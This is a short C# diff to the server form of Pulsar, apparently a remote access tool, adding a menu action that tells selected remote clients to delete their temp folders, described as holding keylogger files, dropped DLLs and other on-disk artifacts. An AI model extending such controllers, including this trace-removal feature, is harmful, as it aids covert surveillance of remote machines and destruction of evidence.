@@ -5467,6 +5467,23 @@ namespace Pulsar.Server.Forms
                 c.Send(new DoShutdownAction { Action = ShutdownAction.Lockscreen });
             }
         }
+
+        private void deleteTempDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            DialogResult result = MessageBox.Show(
+                "This will delete everything inside the Client's temp folder. This includes keylogger files, dropped temp files, DLLs, and other artifacts written to disk.\n\nContinue?",
+                "Confirm Cleanup",
+                MessageBoxButtons.YesNo,
+                MessageBoxIcon.Warning);
+
+            if (result != DialogResult.Yes)
+                return;
+
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoClearTempDirectory());
+            }
+        }
     }
 
     public class NotificationEntry
@@ -5502,12 +5519,12 @@ namespace Pulsar.Server.Forms
         private readonly FrmMain _form;
         private readonly List<ToolStripMenuItem> _pluginMenuItems = new List<ToolStripMenuItem>();
         private readonly object _pluginTag = new object();
-        
+
         public ServerContext(FrmMain form) { _form = form; }
         public Form MainForm => _form;
         public PulsarServer Server => _form.ListenServer;
         public void Log(string message) { _form.EventLog(message, "info"); }
-        
+
         public void ClearPluginMenuItems()
         {
             if (_form == null || _form.IsDisposed) return;
